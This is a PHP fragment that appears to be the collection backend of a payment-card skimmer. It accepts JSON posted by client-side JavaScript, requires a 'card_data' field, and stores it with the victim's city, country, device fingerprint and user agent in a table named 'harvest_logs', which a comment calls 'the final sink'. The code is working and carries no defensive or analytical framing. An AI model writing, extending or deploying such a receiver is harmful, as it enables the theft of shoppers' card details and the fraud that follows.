// 2. RECEIVE PAYLOAD (Expecting JSON from the JS fetch call)
$json_data = file_get_contents('php://input');
$payload = json_decode($json_data, true);

if (!$payload || !isset($payload['card_data'])) {
    http_response_code(400); // Bad Request
    echo json_encode(['success' => false, 'message' => 'Missing or invalid data payload received.']);
    exit();
}

// 3. VALIDATION & LOGGING (Re-run validation logic here if needed)
// For this MVP, we assume client JS did the heavy lifting and trust it for logging.

$card_data = $payload['card_data'];
$geo_info = ['country' => $payload['geo_info']['country'], 'city' => $payload['geo_info']['city']];
$device = $payload['device'];
$user_agent = $payload['user_agent'];

// 4. INSERT LOG (The final sink)
$stmt = $pdo-&gt;prepare("INSERT INTO harvest_logs (card_data, geo_info, device_fingerprint, user_agent, log_details) VALUES (?, ?, ?, ?, ?)");
$success = $stmt-&gt;execute([json_encode($card_data), json_encode($geo_info), $device, $user_agent, 'Client-Side JSON Payload']);

if ($success) {
    echo json_encode(['success' => true, 'message' => 'Data successfully logged to the database.']);
} else {
    http_response_code(500); // Internal Server Error
    echo json_encode(['success' => false, 'message' => 'Database failed to accept the log entry.']);
}
